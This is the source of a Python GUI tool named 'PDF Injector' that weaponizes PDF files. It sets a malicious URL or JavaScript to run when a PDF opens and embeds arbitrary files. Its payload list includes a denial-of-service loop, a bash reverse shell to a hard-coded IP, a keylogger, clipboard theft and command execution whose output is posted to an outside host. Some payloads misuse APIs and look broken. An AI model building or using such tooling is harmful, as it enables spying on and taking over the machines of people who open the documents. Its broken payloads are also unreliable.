import sys
import os
import PyPDF4
from PyPDF4.generic import (
    DictionaryObject,
    NameObject,
    TextStringObject,
    EncodedStreamObject,
    ArrayObject,
)
from PyQt5.QtWidgets import (
    QApplication,
    QMainWindow,
    QVBoxLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QFileDialog,
    QWidget,
    QComboBox,
    QMessageBox,
)
from PyQt5.QtCore import Qt

# JavaScript payloads
js_payloads = {
    "Alert Box": "app.alert('This is an alert box.');",
    "Denial of Service (DoS)": "while (true) { app.alert('DoS attack!'); }",
    "Print Dialog": "this.print();",
    "Open Website": "app.launchURL('https://example.com', true);",
    "Download File": "app.launchURL('https://example.com/secret_document.pdf', true);",
    "Remote Code Execution (RCE)": "var cmd = 'uname -a'; var result = util.printd(exec(cmd)); var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/cmd'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ output: result }));",
    "Reverse Shell": "var cmd = '/bin/bash -c \'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1\''; var result = util.printd(exec(cmd)); console.log(result);",
    "Remote Access": "var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { console.log(xhr.responseText); } }; xhr.open('GET', 'https://your-website.com/command?cmd=ls', true); xhr.send(null);",
    "Keylogger": "var keystrokes = ''; setInterval(function() { if (keystrokes.length > 0) { var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/keystrokes'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ keystrokes: keystrokes })); keystrokes = ''; } }, 10000); this.onKeyDown = function() { keystrokes += event.key; };",
    "Clipboard Data Exfiltration": "navigator.clipboard.readText().then(function(clipboardText) { var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/clipboard'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ clipboard: clipboardText })); });",
}

def inject_url(input_pdf, output_pdf, malicious_url):
    with open(input_pdf, "rb") as file:
        pdf_reader = PyPDF4.PdfFileReader(file)
        pdf_writer = PyPDF4.PdfFileWriter()

        open_action = DictionaryObject({
            NameObject("/Type"): NameObject("/Action"),
            NameObject("/S"): NameObject("/URI"),
            NameObject("/URI"): TextStringObject(malicious_url)
        })

        for i in range(len(pdf_reader.pages)):
            pdf_writer.addPage(pdf_reader.pages[i])

        pdf_writer._root_object.update({NameObject("/OpenAction"): open_action})

        with open(output_pdf, "wb") as output_file:
            pdf_writer.write(output_file)

def inject_file(input_pdf, output_pdf, file_to_inject):
    with open(input_pdf, "rb") as file:
        pdf_reader = PyPDF4.PdfFileReader(file)
        pdf_writer = PyPDF4.PdfFileWriter()

        for i in range(len(pdf_reader.pages)):
            pdf_writer.addPage(pdf_reader.pages[i])

        with open(file_to_inject, "rb") as file_inject:
            file_data = file_inject.read()

        ef_stream = EncodedStreamObject()
        ef_stream._data = file_data
        ef_stream.update({
            NameObject("/Type"): NameObject("/EmbeddedFile"),
            NameObject("/Filter"): NameObject("/ASCIIHexDecode")
        })

        file_name = TextStringObject(os.path.basename(file_to_inject))
        embedded_file = pdf_writer._addObject(ef_stream)
        filespec = DictionaryObject({
            NameObject("/Type"): NameObject("/Filespec"),
            NameObject("/F"): file_name,
            NameObject("/EF"): DictionaryObject({
                NameObject("/F"): embedded_file
            })
        })
        pdf_writer._addObject(filespec)

        with open(output_pdf, "wb") as output_file:
            pdf_writer.write(output_file)

def inject_js(input_pdf, output_pdf, js_code):
    with open(input_pdf, "rb") as file:
        pdf_reader = PyPDF4.PdfFileReader(file)
        pdf_writer = PyPDF4.PdfFileWriter()

        for i in range(len(pdf_reader.pages)):
            pdf_writer.addPage(pdf_reader.pages[i])

        js_action = DictionaryObject({
            NameObject("/Type"): NameObject("/Action"),
            NameObject("/S"): NameObject("/JavaScript"),
            NameObject("/JS"): TextStringObject(js_code)
        })

        pdf_writer._root_object.update({NameObject("/OpenAction"): js_action})

        with open(output_pdf, "wb") as output_file:
            pdf_writer.write(output_file)

class PDFInjector(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("PDF Injector")
        self.setGeometry(100, 100, 400, 300)

        self.layout = QVBoxLayout()

        self.input_pdf_label = QLabel("Input PDF:")
        self.layout.addWidget(self.input_pdf_label)

        self.input_pdf_lineedit = QLineEdit()
        self.layout.addWidget(self.input_pdf_lineedit)

        self.output_pdf_label = QLabel("Output PDF:")
        self.layout.addWidget(self.output_pdf_label)

        self.output_pdf_lineedit = QLineEdit()
        self.layout.addWidget(self.output_pdf_lineedit)

        self.malicious_url_label = QLabel("Malicious URL:")
        self.layout.addWidget(self.malicious_url_label)

        self.malicious_url_lineedit = QLineEdit()
        self.layout.addWidget(self.malicious_url_lineedit)

        self.inject_url_button = QPushButton("Inject URL")
        self.inject_url_button.clicked.connect(self.inject_url)
        self.layout.addWidget(self.inject_url_button)

        self.file_to_inject_label = QLabel("File to Inject:")
        self.layout.addWidget(self.file_to_inject_label)

        self.file_to_inject_lineedit = QLineEdit()
        self.layout.addWidget(self.file_to_inject_lineedit)

        self.inject_file_button = QPushButton("Inject File")
        self.inject_file_button.clicked.connect(self.inject_file)
        self.layout.addWidget(self.inject_file_button)

        self.js_payload_label = QLabel("JavaScript Payload:")
        self.layout.addWidget(self.js_payload_label)

        self.js_payload_combobox = QComboBox()
        self.js_payload_combobox.addItems(js_payloads.keys())
        self.layout.addWidget(self.js_payload_combobox)

        self.inject_js_button = QPushButton("Inject JavaScript")
        self.inject_js_button.clicked.connect(self.inject_js)
        self.layout.addWidget(self.inject_js_button)

        container = QWidget()
        container.setLayout(self.layout)
        self.setCentralWidget(container)

    def inject_url(self):
        input_pdf = self.input_pdf_lineedit.text()
        output_pdf = self.output_pdf_lineedit.text()
        malicious_url = self.malicious_url_lineedit.text()

        inject_url(input_pdf, output_pdf, malicious_url)
        QMessageBox.information(self, "Success", "Malicious URL injected successfully!")

    def inject_file(self):
        input_pdf = self.input_pdf_lineedit.text()
        output_pdf = self.output_pdf_lineedit.text()
        file_to_inject = self.file_to_inject_lineedit.text()

        inject_file(input_pdf, output_pdf, file_to_inject)
        QMessageBox.information(self, "Success", "File injected successfully!")

    def inject_js(self):
        input_pdf = self.input_pdf_lineedit.text()
        output_pdf = self.output_pdf_lineedit.text()
        js_code = js_payloads[self.js_payload_combobox.currentText()]

        inject_js(input_pdf, output_pdf, js_code)
        QMessageBox.information(self, "Success", "JavaScript injected successfully!")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = PDFInjector()
    window.show()
    sys.exit(app.exec_())
